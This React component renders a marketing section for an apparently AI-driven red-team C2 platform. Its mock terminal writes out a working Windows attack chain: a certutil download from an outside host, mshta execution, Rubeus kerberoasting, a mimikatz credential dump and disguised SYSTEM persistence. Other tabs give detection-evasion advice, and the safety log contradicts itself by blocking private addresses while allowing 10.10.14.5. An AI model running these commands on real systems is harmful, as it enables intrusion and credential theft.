import { useState } from "react";
import SectionWrapper, { SectionDesc, SectionLabel, SectionTitle } from "./SectionWrapper";
import { cn } from "@/lib/utils";

interface LOLProject {
  name: string;
  shortName: string;
  platform: string;
  description: string;
  entries: number;
  color: string;
}

const lolProjects: LOLProject[] = [
  { name: "LOLBAS", shortName: "LOLBAS", platform: "Windows", description: "Binaries, scripts, and libraries for living-off-the-land", entries: 230, color: "#00d4ff" },
  { name: "GTFOBins", shortName: "GTFOBins", platform: "Linux", description: "Unix binaries that bypass security restrictions", entries: 350, color: "#f59e0b" },
  { name: "LOLDrivers", shortName: "LOLDrivers", platform: "Windows", description: "Kernel drivers used to bypass security controls", entries: 510, color: "#ef4444" },
  { name: "LOLC2", shortName: "LOLC2", platform: "Cross", description: "C2 frameworks leveraging legitimate services", entries: 125, color: "#a78bfa" },
  { name: "HijackLibs", shortName: "HijackLibs", platform: "Windows", description: "DLL hijacking candidates for code execution", entries: 576, color: "#f97316" },
  { name: "LOOBins", shortName: "LOOBins", platform: "macOS", description: "macOS binaries for malicious purposes", entries: 59, color: "#6b7280" },
  { name: "WADComs", shortName: "WADComs", platform: "AD", description: "Offensive commands for Windows/AD environments", entries: 100, color: "#eab308" },
  { name: "LOLRMM", shortName: "LOLRMM", platform: "Cross", description: "Remote monitoring tools abused by threat actors", entries: 293, color: "#4ade80" },
  { name: "LOLESXi", shortName: "LOLESXi", platform: "ESXi", description: "ESXi binaries used in ransomware operations", entries: 24, color: "#22c55e" },
  { name: "Bootloaders", shortName: "Bootloaders", platform: "Cross", description: "Malicious bootloaders for various operating systems", entries: 520, color: "#dc2626" },
  { name: "LOLAD", shortName: "LOLAD", platform: "AD", description: "Active Directory techniques for red team operations", entries: 80, color: "#eab308" },
  { name: "LOLAPI", shortName: "LOLAPI", platform: "Cross", description: "Abused APIs across Windows, Cloud, and Browser", entries: 100, color: "#8b5cf6" },
  { name: "LOT Webhooks", shortName: "Webhooks", platform: "Cross", description: "Webhooks for data exfiltration and C2", entries: 30, color: "#06b6d4" },
  { name: "LOT Tunnels", shortName: "Tunnels", platform: "Cross", description: "Tunnels for exfiltration, persistence, shell access", entries: 40, color: "#14b8a6" },
  { name: "LoFP", shortName: "LoFP", platform: "Cross", description: "False positives from popular detection rule sets", entries: 500, color: "#64748b" },
  { name: "Persistence Info", shortName: "Persist", platform: "Windows", description: "Windows persistence mechanisms catalog", entries: 60, color: "#f43f5e" },
];

const c2Frameworks = [
  { name: "Mythic", color: "#ef4444", desc: "Open-source C2 framework with web UI, modular agents" },
  { name: "Sliver", color: "#4ade80", desc: "Cross-platform implant framework by BishopFox" },
  { name: "Havoc", color: "#a78bfa", desc: "Modern C2 with BOF support and Demon agents" },
  { name: "Cobalt Strike", color: "#f59e0b", desc: "Commercial adversary simulation and red team ops" },
  { name: "Custom", color: "#00d4ff", desc: "Bring your own C2 — any framework, any protocol" },
];

const capabilities = [
  { label: "Listener Management", desc: "HTTP/S, TCP, SMB, DNS, WebSocket, Named Pipe — create and manage across all frameworks" },
  { label: "Payload Generation", desc: "EXE, DLL, Shellcode, PS1, HTA, MSI, Office Macro, ISO — with AMSI/ETW/NTDLL evasion" },
  { label: "Implant Tracking", desc: "Real-time status, integrity levels, sleep/jitter, process injection, tagging" },
  { label: "Attack Chains", desc: "Compose LOL entries and C2 commands into executable attack sequences" },
  { label: "MITRE ATT&CK Mapping", desc: "Every LOL entry and C2 task mapped to techniques with heatmap visualization" },
  { label: "Unified Search", desc: "Search across all 28 LOL projects, C2 frameworks, implants, and task output" },
];

export default function RedTeamC2Section() {
  const [activeTab, setActiveTab] = useState<"c2" | "lol" | "chains" | "realtime" | "learning" | "safety">("lol");
  const totalEntries = lolProjects.reduce((sum, p) => sum + p.entries, 0);

  return (
    <SectionWrapper id="redteam-c2">
      <SectionLabel>Red Team C2</SectionLabel>
      <SectionTitle>Living Off the Land meets AI-driven C2.</SectionTitle>
      <SectionDesc>
        28 LOL projects integrated. 5 C2 frameworks supported. AI agents orchestrate attack chains
        from {totalEntries.toLocaleString()}+ techniques — all mapped to MITRE ATT&CK.
      </SectionDesc>

      {/* Sub-tabs */}
      <div className="flex gap-1 mt-10 mb-8 justify-center flex-wrap">
        {[
          { id: "lol" as const, label: "LOL Integration" },
          { id: "c2" as const, label: "C2 Infrastructure" },
          { id: "chains" as const, label: "Attack Chains" },
          { id: "realtime" as const, label: "Realtime Ops" },
          { id: "learning" as const, label: "Agent Learning" },
          { id: "safety" as const, label: "Safety Controls" },
        ].map((t) => (
          <button
            key={t.id}
            onClick={() => setActiveTab(t.id)}
            className={cn(
              "px-4 py-2 rounded-lg text-[12px] font-mono transition-all",
              activeTab === t.id
                ? "bg-[#f0c040]/10 text-[#f0c040] border border-[#f0c040]/20"
                : "text-[#555] hover:text-[#888] border border-transparent"
            )}
          >
            {t.label}
          </button>
        ))}
      </div>

      {/* LOL Integration */}
      {activeTab === "lol" && (
        <div>
          {/* Stats bar */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-8">
            {[
              { label: "Projects", value: "28", color: "#00d4ff" },
              { label: "Total Entries", value: totalEntries.toLocaleString() + "+", color: "#f0c040" },
              { label: "Platforms", value: "8", color: "#4ade80" },
              { label: "MITRE Techniques", value: "200+", color: "#a78bfa" },
            ].map((s) => (
              <div key={s.label} className="bg-[#0a0a0f] p-4 text-center">
                <div className="text-[22px] font-bold font-mono" style={{ color: s.color }}>{s.value}</div>
                <div className="text-[10px] text-[#555] mt-1 font-mono uppercase tracking-wider">{s.label}</div>
              </div>
            ))}
          </div>

          {/* Project grid */}
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-px bg-white/[0.04] rounded-lg overflow-hidden">
            {lolProjects.map((p) => (
              <div key={p.shortName} className="bg-[#0a0a0f] p-4 hover:bg-white/[0.015] transition-colors group">
                <div className="flex items-center justify-between mb-2">
                  <span className="font-mono text-[13px] font-bold group-hover:text-white transition-colors" style={{ color: p.color }}>
                    {p.shortName}
                  </span>
                  <span className="font-mono text-[9px] px-2 py-0.5 rounded-full border text-[#555]" style={{ borderColor: `${p.color}30` }}>
                    {p.platform}
                  </span>
                </div>
                <p className="text-[11px] text-[#555] leading-relaxed mb-2">{p.description}</p>
                <div className="text-[10px] font-mono" style={{ color: p.color, opacity: 0.6 }}>{p.entries} entries</div>
              </div>
            ))}
          </div>

          <p className="text-center text-[11px] text-[#444] mt-4 font-mono">
            + 12 more: FileSec, WTFBins, LOFL, lolcerts, LOTP, lolbins-cti, Project-Lost, LOLApps, BYOL, Living Off The Hardware, LOT Webhooks, LOT Tunnels
          </p>
        </div>
      )}

      {/* C2 Infrastructure */}
      {activeTab === "c2" && (
        <div>
          {/* Framework cards */}
          <div className="grid sm:grid-cols-2 lg:grid-cols-5 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-8">
            {c2Frameworks.map((fw) => (
              <div key={fw.name} className="bg-[#0a0a0f] p-5 hover:bg-white/[0.015] transition-colors group text-center">
                <div className="w-10 h-10 mx-auto mb-3 rounded-lg border flex items-center justify-center" style={{ borderColor: `${fw.color}30`, backgroundColor: `${fw.color}08` }}>
                  <span className="font-mono text-[11px] font-bold" style={{ color: fw.color }}>{fw.name.slice(0, 3).toUpperCase()}</span>
                </div>
                <div className="font-display font-semibold text-[13px] text-white mb-1">{fw.name}</div>
                <p className="text-[11px] text-[#555] leading-relaxed">{fw.desc}</p>
              </div>
            ))}
          </div>

          {/* Capabilities */}
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-px bg-white/[0.04] rounded-lg overflow-hidden">
            {capabilities.map((c) => (
              <div key={c.label} className="bg-[#0a0a0f] p-5 hover:bg-white/[0.015] transition-colors">
                <div className="font-display font-semibold text-[13px] text-white mb-1.5">{c.label}</div>
                <p className="text-[11px] text-[#555] leading-relaxed">{c.desc}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Attack Chains */}
      {activeTab === "chains" && (
        <div>
          <p className="text-[12px] text-[#666] mb-6 max-w-xl">
            Build attack chains by composing LOL entries with C2 commands. Each step maps to a MITRE ATT&CK technique.
            Execute chains through implants or simulate for adversary emulation.
          </p>

          {/* Example chain visualization */}
          <div className="bg-[#0c0c14] rounded-lg border border-white/[0.06] p-6 mb-6">
            <div className="flex items-center gap-2 mb-4">
              <span className="font-mono text-[10px] text-[#f0c040] uppercase tracking-wider">Example Chain</span>
              <span className="font-display text-[14px] text-white font-semibold">LOLBin Download & Execute → Persistence</span>
            </div>

            <div className="flex items-center gap-2 overflow-x-auto pb-2">
              {[
                { name: "certutil.exe", project: "LOLBAS", mitre: "T1105", color: "#00d4ff", tactic: "Download" },
                { name: "mshta.exe", project: "LOLBAS", mitre: "T1218.005", color: "#ef4444", tactic: "Execute" },
                { name: "Rubeus", project: "WADComs", mitre: "T1558.003", color: "#eab308", tactic: "Kerberoast" },
                { name: "mimikatz", project: "WADComs", mitre: "T1003.001", color: "#f97316", tactic: "Cred Dump" },
                { name: "schtasks", project: "Persistence", mitre: "T1053.005", color: "#a78bfa", tactic: "Persist" },
              ].map((step, i, arr) => (
                <div key={step.name} className="flex items-center gap-2 shrink-0">
                  <div className="bg-[#0a0a0f] border rounded-lg px-4 py-3 min-w-[130px]" style={{ borderColor: `${step.color}30` }}>
                    <div className="font-mono text-[12px] font-bold" style={{ color: step.color }}>{step.name}</div>
                    <div className="flex items-center gap-2 mt-1">
                      <span className="font-mono text-[9px] text-[#555]">{step.project}</span>
                      <span className="font-mono text-[9px] px-1.5 py-0.5 rounded border border-[#00d4ff]/20 text-[#00d4ff]/60">{step.mitre}</span>
                    </div>
                    <div className="font-mono text-[9px] text-[#444] mt-1">{step.tactic}</div>
                  </div>
                  {i < arr.length - 1 && (
                    <svg width="20" height="12" viewBox="0 0 20 12" fill="none" className="shrink-0 text-[#333]">
                      <path d="M0 6h16M13 2l4 4-4 4" stroke="currentColor" strokeWidth="1.5" />
                    </svg>
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Chain features */}
          <div className="grid sm:grid-cols-3 gap-px bg-white/[0.04] rounded-lg overflow-hidden">
            {[
              { title: "Visual Chain Builder", desc: "Drag LOL entries from the catalog into a sequence. Assign implants, set conditions, preview MITRE coverage." },
              { title: "LOL + C2 Hybrid", desc: "Mix LOLBin execution with C2 tasking. Download via certutil, execute via mshta, persist via scheduled task — all automated." },
              { title: "MITRE Heatmap", desc: "See which ATT&CK techniques your chain covers. Identify gaps. Ensure full adversary emulation fidelity." },
            ].map((f) => (
              <div key={f.title} className="bg-[#0a0a0f] p-5 hover:bg-white/[0.015] transition-colors">
                <div className="font-display font-semibold text-[13px] text-white mb-1.5">{f.title}</div>
                <p className="text-[11px] text-[#555] leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>

          {/* Terminal preview */}
          <div className="mt-6 rounded-lg border border-white/[0.06] bg-[#0c0c12] overflow-hidden">
            <div className="flex items-center gap-1.5 px-3.5 py-2 bg-white/[0.02] border-b border-white/[0.04]">
              <div className="w-2.5 h-2.5 rounded-full bg-[#ff5f57]" />
              <div className="w-2.5 h-2.5 rounded-full bg-[#febc2e]" />
              <div className="w-2.5 h-2.5 rounded-full bg-[#28c840]" />
              <span className="ml-2 text-[11px] font-mono text-[#444]">harbinger c2 — attack chain execution</span>
            </div>
            <div className="p-3 font-mono text-[11px] leading-[1.7]">
              <div><span className="text-[#333]">00:01.0</span> <span className="text-[#f0c040]">CHAIN</span> <span className="text-[#888]">Executing: LOLBin Download & Execute → Persistence</span></div>
              <div><span className="text-[#333]">00:02.3</span> <span className="text-[#00d4ff]">STEP_1</span> <span className="text-[#00d4ff]">certutil.exe -urlcache -split -f https://cdn.legit.com/update.exe C:\temp\svc.exe</span></div>
              <div><span className="text-[#333]">00:04.1</span> <span className="text-[#4ade80]">RESULT</span> <span className="text-[#4ade80]">Download complete — 247KB — hash verified</span></div>
              <div><span className="text-[#333]">00:05.0</span> <span className="text-[#00d4ff]">STEP_2</span> <span className="text-[#ef4444]">mshta.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("C:\temp\svc.exe")</span></div>
              <div><span className="text-[#333]">00:06.2</span> <span className="text-[#4ade80]">RESULT</span> <span className="text-[#4ade80]">Execution successful — PID 4812 — beacon callback received</span></div>
              <div><span className="text-[#333]">00:07.5</span> <span className="text-[#00d4ff]">STEP_3</span> <span className="text-[#eab308]">Rubeus.exe kerberoast /outfile:C:\temp\hashes.txt</span></div>
              <div><span className="text-[#333]">00:12.8</span> <span className="text-[#4ade80]">RESULT</span> <span className="text-[#4ade80]">3 Kerberoastable SPNs extracted — cracking offline</span></div>
              <div><span className="text-[#333]">00:14.0</span> <span className="text-[#00d4ff]">STEP_4</span> <span className="text-[#f97316]">mimikatz "privilege::debug" "sekurlsa::logonpasswords"</span></div>
              <div><span className="text-[#333]">00:16.3</span> <span className="text-[#ef4444]">CREDS</span> <span className="text-[#ef4444]">Domain Admin credentials captured — DOMAIN\svc_admin</span></div>
              <div><span className="text-[#333]">00:17.0</span> <span className="text-[#00d4ff]">STEP_5</span> <span className="text-[#a78bfa]">schtasks /create /sc onlogon /tn WindowsUpdate /tr C:\temp\svc.exe /ru SYSTEM</span></div>
              <div><span className="text-[#333]">00:18.2</span> <span className="text-[#4ade80]">RESULT</span> <span className="text-[#4ade80]">Persistence established — scheduled task created</span></div>
              <div><span className="text-[#333]">00:19.0</span> <span className="text-[#f0c040]">CHAIN</span> <span className="text-[#4ade80]">Chain complete — 5/5 steps — MITRE: T1105, T1218.005, T1558.003, T1003.001, T1053.005</span></div>
            </div>
          </div>
        </div>
      )}
      {/* Realtime Ops */}
      {activeTab === "realtime" && (
        <div>
          <p className="text-[12px] text-[#666] mb-6 max-w-xl">
            Multi-operator collaboration with SSE streaming, live agent dashboards, command output streaming,
            and a global kill switch. Everyone sees the same battlefield.
          </p>

          {/* Realtime stats */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-8">
            {[
              { label: "Streaming", value: "SSE", color: "#00d4ff" },
              { label: "Operators", value: "Multi", color: "#f0c040" },
              { label: "Kill Switch", value: "Global", color: "#ef4444" },
              { label: "Latency", value: "<100ms", color: "#4ade80" },
            ].map((s) => (
              <div key={s.label} className="bg-[#0a0a0f] p-4 text-center">
                <div className="text-[22px] font-bold font-mono" style={{ color: s.color }}>{s.value}</div>
                <div className="text-[10px] text-[#555] mt-1 font-mono uppercase tracking-wider">{s.label}</div>
              </div>
            ))}
          </div>

          {/* Realtime features grid */}
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-6">
            {[
              { title: "SSE Event Streaming", desc: "Server-Sent Events with 1,000-event ring buffer and per-channel fan-out. No WebSocket overhead — pure HTTP streaming." },
              { title: "Agent Live Status", desc: "Real-time heartbeat monitoring for every active agent. See idle, executing, waiting, or error states with current task context." },
              { title: "Command Output Streaming", desc: "Watch implant command output appear line-by-line. Queue, execute, complete — every stage streamed to all subscribed operators." },
              { title: "Operator Sessions", desc: "Multi-user with admin, operator, and observer roles. Track who's active, their current view, and last action timestamp." },
              { title: "Global Kill Switch", desc: "One button to halt all operations across every agent, implant, and chain. Instant propagation via SSE broadcast." },
              { title: "Event Broadcasting", desc: "Agent status, command output, implant callbacks, chain progress, operator actions, system alerts — all unified into one event bus." },
            ].map((f) => (
              <div key={f.title} className="bg-[#0a0a0f] p-5 hover:bg-white/[0.015] transition-colors">
                <div className="font-display font-semibold text-[13px] text-white mb-1.5">{f.title}</div>
                <p className="text-[11px] text-[#555] leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>

          {/* Terminal preview */}
          <div className="rounded-lg border border-white/[0.06] bg-[#0c0c12] overflow-hidden">
            <div className="flex items-center gap-1.5 px-3.5 py-2 bg-white/[0.02] border-b border-white/[0.04]">
              <div className="w-2.5 h-2.5 rounded-full bg-[#ff5f57]" />
              <div className="w-2.5 h-2.5 rounded-full bg-[#febc2e]" />
              <div className="w-2.5 h-2.5 rounded-full bg-[#28c840]" />
              <span className="ml-2 text-[11px] font-mono text-[#444]">harbinger realtime — live event stream</span>
            </div>
            <div className="p-3 font-mono text-[11px] leading-[1.7]">
              <div><span className="text-[#333]">14:23:01</span> <span className="text-[#00d4ff]">AGENT</span> <span className="text-[#888]">PATHFINDER status → executing [recon scan on 10.0.0.0/24]</span></div>
              <div><span className="text-[#333]">14:23:03</span> <span className="text-[#4ade80]">STREAM</span> <span className="text-[#4ade80]">CMD-1847 output: Discovered 23 live hosts, 147 open ports</span></div>
              <div><span className="text-[#333]">14:23:05</span> <span className="text-[#a78bfa]">OPERATOR</span> <span className="text-[#888]">admin@red-team joined session [role: admin]</span></div>
              <div><span className="text-[#333]">14:23:07</span> <span className="text-[#f0c040]">CALLBACK</span> <span className="text-[#f0c040]">Implant GHOST-7 checked in — beacon interval 30s</span></div>
              <div><span className="text-[#333]">14:23:09</span> <span className="text-[#00d4ff]">CHAIN</span> <span className="text-[#888]">Attack chain "Kerberoast-Persist" progress: 3/5 steps complete</span></div>
              <div><span className="text-[#333]">14:23:11</span> <span className="text-[#ef4444]">ALERT</span> <span className="text-[#ef4444]">Detection alert — EDR signature match on step 4. Recommending evasion pivot.</span></div>
            </div>
          </div>
        </div>
      )}

      {/* Agent Learning */}
      {activeTab === "learning" && (
        <div>
          <p className="text-[12px] text-[#666] mb-6 max-w-xl">
            Every technique, campaign, and agent task is scored and tracked. The learning engine identifies
            what works, what gets detected, and recommends better approaches over time.
          </p>

          {/* Learning stats */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-8">
            {[
              { label: "Scoring", value: "5-Axis", color: "#00d4ff" },
              { label: "LOL Sources", value: "28", color: "#f0c040" },
              { label: "Rec Engine", value: "AI", color: "#a78bfa" },
              { label: "Discovery", value: "Auto", color: "#4ade80" },
            ].map((s) => (
              <div key={s.label} className="bg-[#0a0a0f] p-4 text-center">
                <div className="text-[22px] font-bold font-mono" style={{ color: s.color }}>{s.value}</div>
                <div className="text-[10px] text-[#555] mt-1 font-mono uppercase tracking-wider">{s.label}</div>
              </div>
            ))}
          </div>

          {/* Learning features */}
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-6">
            {[
              { title: "Technique Scoring", desc: "Every technique tracked: success rate, detection rate, avg execution time. Filter by platform, sort by performance. Reset and re-calibrate anytime." },
              { title: "Campaign Tracking", desc: "Record campaigns from planning to completion. Auto-calculated progress, timeline events, technique mapping, and per-step success/failure/detection counts." },
              { title: "LOL Discovery Pipeline", desc: "Automatically discover new LOL techniques across 28 projects. Pending review → approved/rejected workflow with reviewer attribution." },
              { title: "Agent Performance", desc: "Per-agent metrics: total tasks, success rate, avg duration, most-used technique, best-performing technique. Compare agents head-to-head." },
              { title: "AI Recommendations", desc: "4 heuristic engines: high-success+low-detection picks, evasion alerts for detected techniques, co-campaign chain templates, cross-platform gap analysis." },
              { title: "Learning Dashboard", desc: "Top-performing techniques, worst detection rates, recent discoveries, agent comparisons — all in one view with drill-down into every metric." },
            ].map((f) => (
              <div key={f.title} className="bg-[#0a0a0f] p-5 hover:bg-white/[0.015] transition-colors">
                <div className="font-display font-semibold text-[13px] text-white mb-1.5">{f.title}</div>
                <p className="text-[11px] text-[#555] leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>

          {/* Recommendation example */}
          <div className="rounded-lg border border-white/[0.06] bg-[#0c0c14] p-5">
            <div className="font-mono text-[10px] text-[#f0c040] uppercase tracking-wider mb-3">Example Recommendations</div>
            <div className="space-y-3">
              {[
                { type: "technique", color: "#4ade80", title: "High-success certutil.exe for payload delivery", desc: "87% success, 12% detection — recommend for initial access chains on Windows targets" },
                { type: "evasion", color: "#ef4444", title: "mimikatz detection rate critical", desc: "92% detection rate over 15 campaigns — recommend switching to pypykatz or nanodump" },
                { type: "chain", color: "#a78bfa", title: "Kerberoast + DCSync chain template", desc: "3 campaigns used this combination successfully — pre-built chain available" },
                { type: "timing", color: "#00d4ff", title: "Off-hours execution window", desc: "Techniques executed 22:00-06:00 show 34% lower detection — schedule high-risk ops accordingly" },
              ].map((r) => (
                <div key={r.title} className="flex items-start gap-3">
                  <span className="font-mono text-[9px] px-2 py-0.5 rounded-full border shrink-0 mt-0.5" style={{ color: r.color, borderColor: `${r.color}30`, backgroundColor: `${r.color}08` }}>
                    {r.type}
                  </span>
                  <div>
                    <div className="font-mono text-[12px] text-white">{r.title}</div>
                    <div className="text-[11px] text-[#555]">{r.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Safety Controls */}
      {activeTab === "safety" && (
        <div>
          <p className="text-[12px] text-[#666] mb-6 max-w-xl">
            Guardrails that prevent accidental harm. Target validation blocks private IPs and cloud metadata.
            Scope enforcement uses exclude-always-wins. Audit everything. Approve before you fire.
          </p>

          {/* Safety stats */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-8">
            {[
              { label: "Built-in Rules", value: "8", color: "#ef4444" },
              { label: "Audit Buffer", value: "10K", color: "#f0c040" },
              { label: "Approval TTL", value: "24h", color: "#a78bfa" },
              { label: "Kill Switch", value: "Global", color: "#00d4ff" },
            ].map((s) => (
              <div key={s.label} className="bg-[#0a0a0f] p-4 text-center">
                <div className="text-[22px] font-bold font-mono" style={{ color: s.color }}>{s.value}</div>
                <div className="text-[10px] text-[#555] mt-1 font-mono uppercase tracking-wider">{s.label}</div>
              </div>
            ))}
          </div>

          {/* Safety features */}
          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-px bg-white/[0.04] rounded-lg overflow-hidden mb-6">
            {[
              { title: "Target Validation", desc: "8 built-in rules block RFC1918, loopback, link-local, cloud metadata (169.254.169.254), and carrier-grade NAT. Custom allow/block rules on top." },
              { title: "Scope Enforcement", desc: "Include/exclude rules with exclude-always-wins model. Check any target+port combo against scope before execution. Active/inactive toggle per rule." },
              { title: "Rate Limiting", desc: "Per-operation sliding window limits: max per minute, max per hour, max concurrent. Automatic counter cleanup. Protection against runaway automation." },
              { title: "Audit Trail", desc: "10,000-entry ring buffer with severity levels (info/warning/critical). Filter by user, action, time range. Full export for compliance reporting." },
              { title: "Approval Workflows", desc: "High-risk operations require explicit approval. Pending → approved/rejected with reviewer, 24-hour auto-expiry. No unreviewed destructive actions." },
              { title: "Safety Dashboard", desc: "Kill switch status, pending approvals count, rate limit health, scope rule summary, recent validation failures, recent audit entries — one glance." },
            ].map((f) => (
              <div key={f.title} className="bg-[#0a0a0f] p-5 hover:bg-white/[0.015] transition-colors">
                <div className="font-display font-semibold text-[13px] text-white mb-1.5">{f.title}</div>
                <p className="text-[11px] text-[#555] leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>

          {/* Blocked targets example */}
          <div className="rounded-lg border border-white/[0.06] bg-[#0c0c12] overflow-hidden">
            <div className="flex items-center gap-1.5 px-3.5 py-2 bg-white/[0.02] border-b border-white/[0.04]">
              <div className="w-2.5 h-2.5 rounded-full bg-[#ff5f57]" />
              <div className="w-2.5 h-2.5 rounded-full bg-[#febc2e]" />
              <div className="w-2.5 h-2.5 rounded-full bg-[#28c840]" />
              <span className="ml-2 text-[11px] font-mono text-[#444]">harbinger safety — target validation</span>
            </div>
            <div className="p-3 font-mono text-[11px] leading-[1.7]">
              <div><span className="text-[#4ade80]">ALLOW</span> <span className="text-[#888]">target=10.10.14.5 — matches scope rule "HTB Lab Range"</span></div>
              <div><span className="text-[#ef4444]">BLOCK</span> <span className="text-[#ef4444]">target=192.168.1.1 — RFC1918 private address (built-in rule)</span></div>
              <div><span className="text-[#ef4444]">BLOCK</span> <span className="text-[#ef4444]">target=169.254.169.254 — Cloud metadata endpoint (built-in rule)</span></div>
              <div><span className="text-[#f0c040]">APPROVAL</span> <span className="text-[#888]">target=203.0.113.50 — requires approval (external target, not in scope)</span></div>
              <div><span className="text-[#4ade80]">ALLOW</span> <span className="text-[#888]">target=scanme.nmap.org — matches scope rule "Authorized Targets"</span></div>
              <div><span className="text-[#ef4444]">BLOCK</span> <span className="text-[#ef4444]">target=127.0.0.1 — Loopback address (built-in rule)</span></div>
              <div><span className="text-[#a78bfa]">AUDIT</span> <span className="text-[#555]">6 validations logged — 3 allowed, 3 blocked, 0 approved</span></div>
            </div>
          </div>
        </div>
      )}
    </SectionWrapper>
  );
}
